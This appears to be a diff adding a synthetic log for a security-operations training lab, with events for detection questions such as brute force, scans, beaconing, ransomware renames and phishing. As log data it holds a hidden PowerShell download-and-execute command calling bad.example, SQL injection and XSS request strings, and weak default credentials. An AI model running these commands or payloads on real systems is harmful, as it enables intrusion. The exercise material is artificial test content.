@@ -1,0 +1,341 @@
+# SOC Lab - combined security log (all 30 question datasets merged, sorted by time)
+# One event per line, key=value format. Example: grep 'event=firewall' security.log
+# 338 events  |  2026-08-01 09:00:00  ..  2026-09-06 03:12:00
+event=logins timestamp="2026-08-01 09:00:00" user=ananya src_ip=10.0.0.10 country_code=IN
+event=logins timestamp="2026-08-02 09:10:00" user=ananya src_ip=10.0.0.10 country_code=IN
+event=honeypot timestamp="2026-09-01 00:01:00" src_ip=203.0.113.11 username=root password=123456 result=failed
+event=honeypot timestamp="2026-09-01 00:01:10" src_ip=203.0.113.11 username=admin password=admin result=failed
+event=honeypot timestamp="2026-09-01 00:01:20" src_ip=203.0.113.11 username=root password=toor result=success
+event=honeypot timestamp="2026-09-01 00:02:00" src_ip=203.0.113.12 username=admin password=admin result=failed
+event=honeypot timestamp="2026-09-01 00:03:00" src_ip=203.0.113.11 username=root password=password result=failed
+event=honeypot timestamp="2026-09-01 00:04:00" src_ip=192.0.2.88 username=user password=user result=failed
+event=access timestamp="2026-09-01 01:00:00" src_ip=198.51.100.50 method=GET path=/ status=200 user_agent=sqlmap/1.7
+event=dns_logs timestamp="2026-09-01 01:00:00" src_host=10.0.1.20 query=a8f91d72xkq9z.example response=NXDOMAIN
+event=access timestamp="2026-09-01 01:00:00" src_ip=198.51.100.66 method=GET path="/search?q=' OR 1=1--" status=200 user_agent=Mozilla/5.0
+event=auth_remote timestamp="2026-09-01 01:00:00" user=svc_backup src_host=WS-07 dst_host=SRV-01 status=success
+event=access timestamp="2026-09-01 01:00:02" src_ip=198.51.100.50 method=GET path=/admin status=404 user_agent=Nikto/2.5
+event=dns_logs timestamp="2026-09-01 01:00:10" src_host=10.0.1.20 query=long-random-subdomain-983746.example response=NXDOMAIN
+event=dns_logs timestamp="2026-09-01 01:01:00" src_host=10.0.1.20 query=missing-xyz.example response=NXDOMAIN
+event=process_logs timestamp="2026-09-01 01:01:01" host=WS-07 user=ananya process=powershell.exe command_line="powershell.exe -enc SQBFAFgA"
+event=access timestamp="2026-09-01 01:02:00" src_ip=203.0.113.81 method=GET path=/ status=200 user_agent=masscan/1.3
+event=access timestamp="2026-09-01 01:02:00" src_ip=198.51.100.66 method=GET path="/item?id=1 UNION SELECT password" status=500 user_agent=Mozilla/5.0
+event=process_logs timestamp="2026-09-01 01:03:11" host=WS-07 user=ananya process=powershell.exe command_line="powershell.exe -w hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://bad.example/a')"
+event=access timestamp="2026-09-01 01:04:00" src_ip=203.0.113.44 method=GET path=/comment?q=<script>alert(1)</script> status=403 user_agent=Mozilla/5.0
+event=auth_remote timestamp="2026-09-01 01:05:00" user=svc_backup src_host=SRV-01 dst_host=SRV-02 status=success
+event=auth_remote timestamp="2026-09-01 01:10:00" user=svc_backup src_host=SRV-02 dst_host=FILE-01 status=success
+event=auth_remote timestamp="2026-09-01 01:15:00" user=svc_backup src_host=FILE-01 dst_host=DC-01 status=success
+event=logons timestamp="2026-09-01 01:22:00" user=svc_backup src_ip=198.51.100.18 dst_host=WS-04 logon_type=10 status=success
+event=connections timestamp="2026-09-01 01:59:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=win_events timestamp="2026-09-01 02:00:00" event_id=4728 actor=jdoe target_user=tempadmin group="Domain Admins" actor_is_admin=no host=DC-01
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=admin status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=root status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=finance status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=hr status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=sales status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=helpdesk status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=backup status=failure
+event=auth timestamp="2026-09-01 02:00:00" src_ip=198.51.100.90 user=ceo status=failure
+event=dns_logs timestamp="2026-09-01 02:00:00" src_host=10.0.3.77 query=x0.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:00" src_ip=198.51.100.66 method=GET path=/.env status=404
+event=auth timestamp="2026-09-01 02:00:00" user=ananya src_ip=198.51.100.77 host=WS-07 status=failure
+event=file_activity timestamp="2026-09-01 02:00:00" host=WS-07 user=ananya file_path=C:\Data\file0.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:01" src_host=10.0.3.77 query=x1.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:01" src_ip=198.51.100.66 method=GET path=/wp-admin status=404
+event=file_activity timestamp="2026-09-01 02:00:01" host=WS-07 user=ananya file_path=C:\Data\file1.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:02" src_host=10.0.3.77 query=x2.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:02" src_ip=198.51.100.66 method=GET path=/admin status=404
+event=file_activity timestamp="2026-09-01 02:00:02" host=WS-07 user=ananya file_path=C:\Data\file2.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:03" src_host=10.0.3.77 query=x3.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:03" src_ip=198.51.100.66 method=GET path=/backup status=404
+event=file_activity timestamp="2026-09-01 02:00:03" host=WS-07 user=ananya file_path=C:\Data\file3.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:04" src_host=10.0.3.77 query=x4.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:04" src_ip=198.51.100.66 method=GET path=/phpmyadmin status=404
+event=file_activity timestamp="2026-09-01 02:00:04" host=WS-07 user=ananya file_path=C:\Data\file4.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:05" src_host=10.0.3.77 query=x5.beacon.example response=NOERROR
+event=access timestamp="2026-09-01 02:00:05" src_ip=198.51.100.66 method=GET path=/config status=404
+event=file_activity timestamp="2026-09-01 02:00:05" host=WS-07 user=ananya file_path=C:\Data\file5.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:06" src_host=10.0.3.77 query=x6.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:06" host=WS-07 user=ananya file_path=C:\Data\file6.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:07" src_host=10.0.3.77 query=x7.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:07" host=WS-07 user=ananya file_path=C:\Data\file7.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:08" src_host=10.0.3.77 query=x8.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:08" host=WS-07 user=ananya file_path=C:\Data\file8.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:09" src_host=10.0.3.77 query=x9.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:09" host=WS-07 user=ananya file_path=C:\Data\file9.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:10" src_host=10.0.3.77 query=x10.beacon.example response=NOERROR
+event=auth timestamp="2026-09-01 02:00:10" user=ananya src_ip=198.51.100.77 host=WS-07 status=failure
+event=file_activity timestamp="2026-09-01 02:00:10" host=WS-07 user=ananya file_path=C:\Data\file10.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:11" src_host=10.0.3.77 query=x11.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:11" host=WS-07 user=ananya file_path=C:\Data\file11.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:12" src_host=10.0.3.77 query=x12.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:12" host=WS-07 user=ananya file_path=C:\Data\file12.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:13" src_host=10.0.3.77 query=x13.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:13" host=WS-07 user=ananya file_path=C:\Data\file13.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:14" src_host=10.0.3.77 query=x14.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:14" host=WS-07 user=ananya file_path=C:\Data\file14.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:15" src_host=10.0.3.77 query=x15.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:15" host=WS-07 user=ananya file_path=C:\Data\file15.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:16" src_host=10.0.3.77 query=x16.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:16" host=WS-07 user=ananya file_path=C:\Data\file16.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:17" src_host=10.0.3.77 query=x17.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:17" host=WS-07 user=ananya file_path=C:\Data\file17.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:18" src_host=10.0.3.77 query=x18.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:18" host=WS-07 user=ananya file_path=C:\Data\file18.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:19" src_host=10.0.3.77 query=x19.beacon.example response=NOERROR
+event=file_activity timestamp="2026-09-01 02:00:19" host=WS-07 user=ananya file_path=C:\Data\file19.locked operation=rename extension=.locked
+event=dns_logs timestamp="2026-09-01 02:00:20" src_host=10.0.3.77 query=x20.beacon.example response=NOERROR
+event=auth timestamp="2026-09-01 02:00:20" user=ananya src_ip=198.51.100.77 host=WS-07 status=failure
+event=dns_logs timestamp="2026-09-01 02:00:21" src_host=10.0.3.77 query=x21.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:22" src_host=10.0.3.77 query=x22.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:23" src_host=10.0.3.77 query=x23.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:24" src_host=10.0.3.77 query=x24.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:25" src_host=10.0.3.77 query=x25.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:26" src_host=10.0.3.77 query=x26.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:27" src_host=10.0.3.77 query=x27.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:28" src_host=10.0.3.77 query=x28.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:29" src_host=10.0.3.77 query=x29.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:30" src_host=10.0.3.77 query=x30.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:31" src_host=10.0.3.77 query=x31.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:32" src_host=10.0.3.77 query=x32.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:33" src_host=10.0.3.77 query=x33.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:34" src_host=10.0.3.77 query=x34.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:35" src_host=10.0.3.77 query=x35.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:36" src_host=10.0.3.77 query=x36.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:37" src_host=10.0.3.77 query=x37.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:38" src_host=10.0.3.77 query=x38.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:39" src_host=10.0.3.77 query=x39.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:40" src_host=10.0.3.77 query=x40.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:41" src_host=10.0.3.77 query=x41.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:42" src_host=10.0.3.77 query=x42.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:43" src_host=10.0.3.77 query=x43.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:44" src_host=10.0.3.77 query=x44.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:45" src_host=10.0.3.77 query=x45.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:46" src_host=10.0.3.77 query=x46.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:47" src_host=10.0.3.77 query=x47.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:48" src_host=10.0.3.77 query=x48.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:49" src_host=10.0.3.77 query=x49.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:50" src_host=10.0.3.77 query=x50.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:51" src_host=10.0.3.77 query=x51.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:52" src_host=10.0.3.77 query=x52.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:53" src_host=10.0.3.77 query=x53.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:54" src_host=10.0.3.77 query=x54.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:55" src_host=10.0.3.77 query=x55.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:56" src_host=10.0.3.77 query=x56.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:57" src_host=10.0.3.77 query=x57.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:58" src_host=10.0.3.77 query=x58.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:00:59" src_host=10.0.3.77 query=x59.beacon.example response=NOERROR
+event=connections timestamp="2026-09-01 02:00:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=dns_logs timestamp="2026-09-01 02:01:00" src_host=10.0.3.77 query=x60.beacon.example response=NOERROR
+event=auth timestamp="2026-09-01 02:01:00" user=ananya src_ip=198.51.100.77 host=WS-07 status=success
+event=dns_logs timestamp="2026-09-01 02:01:01" src_host=10.0.3.77 query=x61.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:02" src_host=10.0.3.77 query=x62.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:03" src_host=10.0.3.77 query=x63.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:04" src_host=10.0.3.77 query=x64.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:05" src_host=10.0.3.77 query=x65.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:06" src_host=10.0.3.77 query=x66.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:07" src_host=10.0.3.77 query=x67.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:08" src_host=10.0.3.77 query=x68.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:09" src_host=10.0.3.77 query=x69.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:10" src_host=10.0.3.77 query=x70.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:11" src_host=10.0.3.77 query=x71.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:12" src_host=10.0.3.77 query=x72.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:13" src_host=10.0.3.77 query=x73.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:14" src_host=10.0.3.77 query=x74.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:15" src_host=10.0.3.77 query=x75.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:16" src_host=10.0.3.77 query=x76.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:17" src_host=10.0.3.77 query=x77.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:18" src_host=10.0.3.77 query=x78.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:19" src_host=10.0.3.77 query=x79.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:20" src_host=10.0.3.77 query=x80.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:21" src_host=10.0.3.77 query=x81.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:22" src_host=10.0.3.77 query=x82.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:23" src_host=10.0.3.77 query=x83.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:24" src_host=10.0.3.77 query=x84.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:25" src_host=10.0.3.77 query=x85.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:26" src_host=10.0.3.77 query=x86.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:27" src_host=10.0.3.77 query=x87.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:28" src_host=10.0.3.77 query=x88.beacon.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 02:01:29" src_host=10.0.3.77 query=x89.beacon.example response=NOERROR
+event=connections timestamp="2026-09-01 02:01:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:03:01" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:03:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=network timestamp="2026-09-01 02:05:00" src_ip=10.0.1.24 dst_ip=198.51.100.201 bytes_out=850000000 destination=c2-rare.example
+event=connections timestamp="2026-09-01 02:05:01" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:06:01" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:07:01" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:07:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=connections timestamp="2026-09-01 02:09:01" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=proxy_downloads timestamp="2026-09-01 02:10:00" user=ananya src_ip=10.0.1.24 domain=cdn-rare.example url=/files/update.exe file_type=exe bytes=583000 category=uncategorized
+event=logins timestamp="2026-09-01 02:10:00" user=ananya src_ip=198.51.100.77 country_code=RU
+event=proxy timestamp="2026-09-01 02:10:00" user=ananya src_ip=10.0.1.24 destination=upload-rare.example bytes_out=950000000 category=uncategorized
+event=endpoint timestamp="2026-09-01 02:10:00" host=WS-07 user=ananya parent_process=winword.exe child_process=powershell.exe command_line="powershell -enc SQBFAFgA"
+event=alerts timestamp="2026-09-01 02:10:00" indicator_type=ip indicator=198.51.100.201 alert_name="Outbound connection" severity=high
+event=connections timestamp="2026-09-01 02:10:00" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=alerts timestamp="2026-09-01 02:10:00" alert_id=A001 severity=critical asset=DC-01 asset_criticality=5 ti_match=yes confidence=95
+event=connections timestamp="2026-09-01 02:10:59" src_ip=10.0.3.77 dst_ip=198.51.100.201 dst_port=443 protocol=TCP
+event=proxy_downloads timestamp="2026-09-01 02:12:00" user=ananya src_ip=10.0.1.24 domain=unknown-download.example url=/x.scr file_type=scr bytes=120000 category=unknown
+event=endpoint timestamp="2026-09-01 02:12:00" host=WS-07 user=ananya parent_process=excel.exe child_process=wscript.exe command_line="wscript.exe C:\\Users\\Public\\x.vbs"
+event=alerts timestamp="2026-09-01 02:12:00" alert_id=A002 severity=high asset=WS-07 asset_criticality=3 ti_match=yes confidence=88
+event=auth timestamp="2026-09-01 02:14:00" src_ip=198.51.100.77 user=ananya status=failure
+event=auth_events timestamp="2026-09-01 02:14:03" user=ananya src_ip=198.51.100.77 country=RU logon_type=interactive status=failure
+event=auth timestamp="2026-09-01 02:14:10" src_ip=198.51.100.77 user=ananya status=failure
+event=auth_events timestamp="2026-09-01 02:14:18" user=ananya src_ip=198.51.100.77 country=RU logon_type=interactive status=failure
+event=auth timestamp="2026-09-01 02:14:20" src_ip=198.51.100.77 user=ananya status=failure
+event=auth_events timestamp="2026-09-01 02:14:29" user=ananya src_ip=198.51.100.77 country=RU logon_type=interactive status=success
+event=auth timestamp="2026-09-01 02:14:30" src_ip=198.51.100.77 user=ananya status=failure
+event=auth timestamp="2026-09-01 02:14:40" src_ip=198.51.100.77 user=ananya status=failure
+event=auth timestamp="2026-09-01 02:15:00" src_ip=198.51.100.77 user=ananya status=success
+event=alerts timestamp="2026-09-01 02:15:00" indicator_type=domain indicator=c2-rare.example alert_name="DNS query" severity=high
+event=proxy timestamp="2026-09-01 02:20:00" user=ananya src_ip=10.0.1.24 destination=198.51.100.222 bytes_out=250000000 category=unknown
+event=auth timestamp="2026-09-01 03:00:00" src_ip=203.0.113.80 user=admin status=failure
+event=firewall timestamp="2026-09-01 03:00:00" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=20 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:00" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=1 action=BLOCK
+event=emails timestamp="2026-09-01 03:00:00" from_address=ceo@corp.example return_path=attacker@evil.example spf=fail dkim=fail subject="Urgent payment"
+event=alerts timestamp="2026-09-01 03:00:00" alert_id=A000 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:01" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=21 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:01" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=2 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:01" alert_id=A001 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:02" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:02" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=3 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:02" alert_id=A002 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:03" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=23 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:03" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=4 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:03" alert_id=A003 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:04" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=24 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:04" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=5 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:04" alert_id=A004 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:05" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=25 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:05" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=6 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:05" alert_id=A005 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:06" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=26 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:06" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=7 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:06" alert_id=A006 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:07" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=27 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:07" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=8 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:07" alert_id=A007 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:08" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=28 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:08" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=9 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:08" alert_id=A008 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:09" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=29 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:09" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=10 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:09" alert_id=A009 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:10" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=30 action=BLOCK
+event=firewall timestamp="2026-09-01 03:00:10" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=11 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:10" alert_id=A010 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:11" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=12 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:11" alert_id=A011 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:12" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=13 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:12" alert_id=A012 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:13" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=14 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:13" alert_id=A013 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:14" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=15 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:14" alert_id=A014 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:15" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=16 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:15" alert_id=A015 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:16" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=17 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:16" alert_id=A016 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:17" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=18 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:17" alert_id=A017 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:18" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=19 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:18" alert_id=A018 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:19" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=20 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:19" alert_id=A019 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=auth timestamp="2026-09-01 03:00:20" src_ip=203.0.113.80 user=admin status=failure
